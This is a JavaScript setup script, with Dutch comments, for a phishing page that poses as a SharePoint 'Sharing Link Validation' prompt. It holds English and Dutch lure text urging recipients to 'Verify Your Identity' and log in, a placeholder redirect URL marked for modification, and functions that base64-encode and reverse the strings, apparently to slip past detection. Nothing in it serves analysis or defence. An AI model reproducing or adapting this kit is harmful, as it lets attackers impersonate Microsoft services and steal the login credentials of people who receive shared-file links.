/////////////////////////////////
// PAS DIT AAN
// // de naam is zichtbaar op de sharepoint landingspagina
var company_name_raw = "PLACEHOLDER"; // Modify

var translationsRaw = {
  en: {
    title: "Sharing Link Validation",
    brand_name: "SharePoint",
    header: "Verify Your Identity",
    file_description_title: "You've received a secure link to:",
    form_message: "To open this secure link, we'll need you to login with the acccount that this item was shared to.",
    button_label: "Login",
    privacy_text: "By clicking Login you allow " + company_name_raw + " to use your account information in accordance with their privacy statement.",
    privacy_link: "Privacy & Cookies"
  },
  nl: {
    title: "Validatie van koppeling voor delen",
    brand_name: "SharePoint",
    header: "Identiteit verifiëren",
    file_description_title: "U hebt een beveiligde koppeling ontvangen naar:",
    form_message: "U moet inloggen met het e-mailadres waarmee dit item is gedeeld, om deze beveiligde koppeling te openen.",
    button_label: "Inloggen",
    privacy_text: "Door op Inloggen te klikken, geeft u " + company_name_raw + " toestemming om je accountgegevens te gebruiken in overeenstemming met hun privacyverklaring.",
    privacy_link: "Privacy en cookies"
  }
};

// dit is de link waar de gebruiker naartoe wordt geredirect nadat de gebruiker op login klikt
var BASE_URL_RAW = "https://login.example.com" // Modify

/////////////////////////////////

// obfuscation logic
function dbfst(str) {
  let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
  let reversed = withoutPrefixSuffix.split("").reverse().join("");
  try {
    return atob(reversed);
  } catch (err) {
    return str;
  }
}

function obfst(str) {
  let encoded = btoa(str);
  let reversed = encoded.split("").reverse().join("");
  return PREFIX + reversed + SUFFIX;
}

function deepObfuscate(obj) {
  if (typeof obj === "string") {
    return obfst(obj);
  }

  if (Array.isArray(obj)) {
    return obj.map(deepObfuscate);
  }

  if (obj && typeof obj === "object") {
    const out = {};
    Object.keys(obj).forEach(function (key) {
      out[key] = deepObfuscate(obj[key]);
    });
    return out;
  }

  return obj;
}

function deepDeobfuscate(obj) {
  if (typeof obj === "string") {
    return dbfst(obj);
  }

  if (Array.isArray(obj)) {
    return obj.map(deepDeobfuscate);
  }

  if (obj && typeof obj === "object") {
    const out = {};
    Object.keys(obj).forEach(function (key) {
      out[key] = deepDeobfuscate(obj[key]);
    });
    return out;
  }

  return obj;
}

const translationsObfuscated = deepObfuscate(translationsRaw);
console.log(translationsObfuscated);

const baseUrlObfuscated = obfst(BASE_URL_RAW);
console.log("BASE_URL: " + baseUrlObfuscated);